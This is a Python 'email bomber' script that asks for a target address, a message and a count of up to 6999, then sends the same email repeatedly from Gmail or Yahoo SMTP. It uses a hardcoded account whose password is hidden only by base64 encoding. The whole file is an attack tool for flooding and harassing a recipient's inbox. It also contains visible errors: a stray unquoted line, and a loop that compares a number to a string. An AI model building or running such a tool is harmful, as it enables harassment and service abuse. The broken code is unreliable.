import smtplib
import time
import os
import getpass
import sys
import base64

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	LITBU = '\033[94m'
	
class FG:
    	black = "\033[30m"
    	red = "\033[31m"
    	green = "\033[32m"
    	orange = "\033[33m"
    	blue = "\033[34m"
    	purple = "\033[35m"
    	cyan = "\033[36m"
    	lightgrey = "\033[37m"
    	darkgrey = "\033[90m"
    	lightred = "\033[91m"
    	lightgreen = "\033[92m"
    	yellow = "\033[93m"
    	lightblue = "\033[94m"
    	pink = "\033[95m"
    	lightcyan = "\033[96m"

def start_bomb():
	os.system('clear')
	print(bcolors.OKGREEN + '''                            																											
[>] Preparing and attacking ...''')

os.system('clear')
print(bcolors.OKGREEN + '''

▓█████  ███▄ ▄███▓ ▄▄▄       ██▓  ██▓      ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒ ▓██▒    ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒ ▒██░    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░ ▒██░      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██
░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░ ░██████▒▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░  ▒░▓  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
 ░ ░  ░By mishakorzik▒   ▒▒ ░ ▒ ░░  ░ ▒  ░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
   ░   ░      ░     ░   ▒    ▒ ░  ░  ░   ░  ░  ░  ░░         ░   ▒   ░      ░
   ░  ░       ░         ░  ░ ░       ░  ░      ░                 ░  ░       ░''')

By mishakorzik
print(bcolors.WARNING + '''												       
\033[95mSelect Mail Service:													
[1] Gmail  -  powered google								
[2] Yahoo  -  powered microsoft
''')
try:
	server = input(bcolors.WARNING + 'Mail Server: ' + bcolors.ENDC)
	user = 'smtp0python@gmail.com'
	base64_message = 'c210cDBweXRob24xOGdtYWls'
	base64_bytes = base64_message.encode('ascii')
	message_bytes = base64.b64decode(base64_bytes)
	pwd = message_bytes.decode('ascii')
	to = input(bcolors.OKGREEN + 'Send To: ' + bcolors.ENDC)
	subject = input(bcolors.LITBU + 'Subject: ' + bcolors.ENDC)
	body = input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
	nomes = input(bcolors.OKGREEN + 'Number of Emails to send (1-6999): ' + bcolors.ENDC)
	no = 0
	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
	print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
	sys.exit()

#Gmail powered google
if server == '1' or server == '01'  or server == 'gmail' or server == 'Gmail':
	start_bomb()
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no+1) + ' emails' + bcolors.ENDC)
			no += 1
		except KeyboardInterrupt:
			print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
			sys.exit()
		except:
			print("Messange failed to Send! ")
	server.close()
	
#Yahoo powered microsoft
elif server == '2' or server == '02' or server == 'Yahoo' or server == 'yahoo':
	server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
	start_bomb()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no + 1) + ' emails' + bcolors.ENDC)
			no += 1
		except KeyboardInterrupt:
			print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
			sys.exit()
		except:
			print("Messange failed to Send! ")
	server.close()
	
else:
	print(bcolors.FAIL + 'Error code: 404 Works only with Gmail, Yahoo ...')
	sys.exit()

